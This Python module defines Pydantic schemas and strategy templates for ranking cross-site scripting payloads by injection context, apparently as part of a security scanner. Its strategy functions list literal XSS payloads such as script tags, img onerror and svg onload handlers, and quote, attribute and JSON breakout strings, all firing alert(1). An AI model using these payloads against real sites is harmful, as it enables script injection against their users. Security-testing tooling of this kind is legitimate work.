"""
Synthesis Strategy Schemas
==========================
Typed models for synthesis strategy selection and ranking.

The synthesis strategy bridge between vulnerability models and payload generation:
  VulnerabilityModel (P2)
    -> StrategySelector (P3) [THIS MODULE]
      -> ConstraintDrivenSynthesis (P4)

A strategy is a plan for how to break out of the current context and reach
code execution. Strategies are ranked by likelihood based on the observed
constraints (character availability, quote types, nesting depth, etc.).
"""
from __future__ import annotations

from enum import StrEnum
from typing import Any

from pydantic import BaseModel, Field


class SynthesisFamilyType(StrEnum):
    """High-level payload families for different injection scenarios."""

    TAG_INJECTION = "tag_injection"  # Close tag, inject <script>, etc.
    ATTRIBUTE_BREAKOUT = "attribute_breakout"  # Close quote, inject event handler
    SCRIPT_STRING_BREAKOUT = "script_string_breakout"  # Close string, inject semicolon + code
    JSON_OBJECT_BREAKOUT = "json_object_breakout"  # Close string + object, inject code
    EVENT_HANDLER = "event_handler"  # Inject event handler (onload, onerror, etc.)
    JAVASCRIPT_PROTOCOL = "javascript_protocol"  # javascript: scheme in URL attributes
    ANGULAR_CSTI = "angular_csti"  # Angular Client-Side Template Injection
    TEMPLATE_INJECTION = "template_injection"  # Jinja2, Handlebars, etc.
    MUTATION_XSS = "mutation_xss"  # Mutation-based XSS (HTML parser quirks)
    DOM_CLOBBERING = "dom_clobbering"  # DOM property name collisions
    IFRAME_INJECTION = "iframe_injection"  # Inject iframe with srcdoc or src
    SVG_INJECTION = "svg_injection"  # Inject SVG with onload handler
    CSS_INJECTION = "css_injection"  # CSS injection (expression(), etc.)
    COMMENT_BYPASS = "comment_bypass"  # Break out using HTML/JS comments
    DATA_URI = "data_uri"  # data: URI for inline content
    BLOB_URI = "blob_uri"  # blob: URI for dynamic content


class SynthesisTechnique(BaseModel):
    """
    A specific payload technique within a family.

    Example family: SCRIPT_STRING_BREAKOUT
    Example techniques:
      - Break quote + inject alert(1) + comment tail
      - Break quote + inject via String.fromCharCode
      - Break quote + inject via indirect eval
    """

    name: str  # e.g., "quote_break_alert_comment"
    description: str = ""  # Human explanation
    payload_template: str = ""  # Placeholder template, e.g., "{close_quote}alert(1)//{comment}"
    requires_chars: list[str] = Field(default_factory=list)  # Required available chars
    avoids_chars: list[str] = Field(default_factory=list)  # Should not use these
    requires_event_trigger: bool = False  # True for event handlers
    requires_page_reload: bool = False  # True for some DOM scenarios
    feasibility_score: float = 0.5  # 0.0-1.0 confidence this will work


class SynthesisStrategy(BaseModel):
    """
    A complete strategy for payload generation.

    Links a family (what to do) with ranked techniques (how to do it).
    Strategy is selected based on VulnerabilityModel constraints.
    """

    id: str  # Unique identifier
    family: SynthesisFamilyType
    applicable_contexts: list[str] = Field(default_factory=list)  # "markup", "js_string_double", etc.
    techniques: list[SynthesisTechnique] = Field(default_factory=list)
    rationale: str = ""  # Why this strategy applies to THIS target
    requires_quote_breakout: bool = False
    requires_object_closure: bool = False
    requires_comment_tail: bool = False
    requires_event_trigger: bool = False
    # Constraints from the model that trigger this strategy
    trigger_constraints: dict[str, Any] = Field(default_factory=dict)


class StrategyRanking(BaseModel):
    """
    Ranked list of strategies for a specific VulnerabilityModel.

    Output of StrategySelector node, input to ConstraintDrivenSynthesis node.
    """

    model_id: str  # Which model this ranking is for
    context_type: str  # The execution context (e.g., "markup", "js_string_double")
    sink_kind: str  # HTML sink, JS sink, JSON sink, etc.
    strategies: list[tuple[SynthesisStrategy, float]] = Field(
        default_factory=list
    )  # (strategy, confidence_score) pairs

    def top_strategy(self) -> tuple[SynthesisStrategy, float] | None:
        """Return the highest-confidence strategy, or None if empty."""
        return self.strategies[0] if self.strategies else None

    def top_n(self, n: int = 3) -> list[tuple[SynthesisStrategy, float]]:
        """Return top N strategies."""
        return self.strategies[:n]

    def summary(self) -> str:
        """Human-readable summary of ranked strategies."""
        lines = [
            f"Ranking for {self.model_id} ({self.context_type} / {self.sink_kind})",
            f"Total strategies: {len(self.strategies)}",
        ]
        for i, (strat, conf) in enumerate(self.strategies[:5], 1):
            lines.append(f"  {i}. {strat.family.value} ({conf:.2%}) - {strat.rationale[:60]}")
        return "\n".join(lines)


# Pre-defined strategy templates for common contexts
# These are refined by StrategySelector based on actual constraints


def _strategies_for_markup() -> list[SynthesisStrategy]:
    """Strategies for HTML markup injection (innerHTML, appendChild, etc.)."""
    return [
        SynthesisStrategy(
            id="tag_injection_script",
            family=SynthesisFamilyType.TAG_INJECTION,
            applicable_contexts=["markup", "html_text"],
            rationale="Inject <script> tag to reach JavaScript execution",
            techniques=[
                SynthesisTechnique(
                    name="simple_script_tag",
                    description="Inject <script>alert(1)</script>",
                    payload_template="<script>alert(1)</script>",
                    requires_chars=["<", ">", "s", "c", "r", "i", "p", "t", "a", "l", "e", "r"],
                ),
                SynthesisTechnique(
                    name="img_onerror",
                    description="Inject <img onerror=alert(1)>",
                    payload_template='<img onerror="alert(1)">',
                    requires_chars=["<", ">", "i", "m", "g", "o", "n", "e", "r", "r", "o", "r"],
                    requires_event_trigger=True,
                ),
                SynthesisTechnique(
                    name="svg_onload",
                    description="Inject <svg onload=alert(1)>",
                    payload_template='<svg onload="alert(1)">',
                    requires_chars=["<", ">", "s", "v", "g", "o", "n", "l", "o", "a", "d"],
                    requires_event_trigger=True,
                ),
            ],
            requires_quote_breakout=False,
            trigger_constraints={},  # No specific trigger constraints for markup
        ),
    ]


def _strategies_for_js_string_double() -> list[SynthesisStrategy]:
    """Strategies for JavaScript string injection (double-quoted)."""
    return [
        SynthesisStrategy(
            id="script_string_breakout_alert",
            family=SynthesisFamilyType.SCRIPT_STRING_BREAKOUT,
            applicable_contexts=["js_string_double"],
            rationale="Break out of string, inject statement, comment tail",
            techniques=[
                SynthesisTechnique(
                    name="quote_semicolon_alert_comment",
                    description='Break quote + inject alert(1) + comment',
                    payload_template='";alert(1)//',
                    requires_chars=['"', ";", "a", "l", "e", "r", "t", "(", "1", ")", "/"],
                ),
                SynthesisTechnique(
                    name="quote_plus_fromCharCode",
                    description='Break quote + use String.fromCharCode',
                    payload_template='";String.fromCharCode(88,83,83)//',
                    requires_chars=['"', ";", "S", "t", "r", "i", "n", "g", ",", ".", "f", "r", "o", "m", "C", "h", "a", "r", "C", "o", "d", "e"],
                ),
            ],
            requires_quote_breakout=True,
            requires_comment_tail=True,
            trigger_constraints={},  # No specific trigger constraints
        ),
    ]


def _strategies_for_json_value() -> list[SynthesisStrategy]:
    """Strategies for JSON value injection (inside eval)."""
    return [
        SynthesisStrategy(
            id="json_object_breakout",
            family=SynthesisFamilyType.JSON_OBJECT_BREAKOUT,
            applicable_contexts=["json_eval"],
            rationale="Break out of JSON string and object, then execute",
            techniques=[
                SynthesisTechnique(
                    name="close_string_close_object_alert",
                    description='Break string + close object + inject alert',
                    payload_template='"}};alert(1);//',
                    requires_chars=['"', "}", ";", "a", "l", "e", "r", "t"],
                ),
            ],
            requires_quote_breakout=True,
            requires_object_closure=True,
            requires_comment_tail=True,
            trigger_constraints={},  # No specific trigger constraints
        ),
    ]


def _strategies_for_attribute() -> list[SynthesisStrategy]:
    """Strategies for HTML attribute injection."""
    return [
        SynthesisStrategy(
            id="attribute_breakout_event",
            family=SynthesisFamilyType.ATTRIBUTE_BREAKOUT,
            applicable_contexts=["attribute", "html_attribute"],
            rationale="Break out of attribute, inject event handler",
            techniques=[
                SynthesisTechnique(
                    name="quote_space_onevent",
                    description='Break quote + inject event handler',
                    payload_template='" onload="alert(1)">',
                    requires_chars=['"', " ", "o", "n", "l", "o", "a", "d", "=", "(", ")"],
                    requires_event_trigger=True,
                ),
                SynthesisTechnique(
                    name="quote_autofocus_onfocus",
                    description='Break quote + autofocus + onfocus handler',
                    payload_template='" autofocus onfocus="alert(1)">',
                    requires_chars=['"', " ", "a", "u", "t", "o", "f", "c", "s", "n", "l", "o", "(", ")"],
                    requires_event_trigger=True,
                ),
            ],
            requires_quote_breakout=True,
            requires_event_trigger=True,
            trigger_constraints={},  # No specific trigger constraints
        ),
    ]


# Registry of all pre-defined strategies
ALL_STRATEGIES: dict[str, list[SynthesisStrategy]] = {
    "markup": _strategies_for_markup(),
    "js_string_double": _strategies_for_js_string_double(),
    "json_eval": _strategies_for_json_value(),
    "attribute": _strategies_for_attribute(),
}
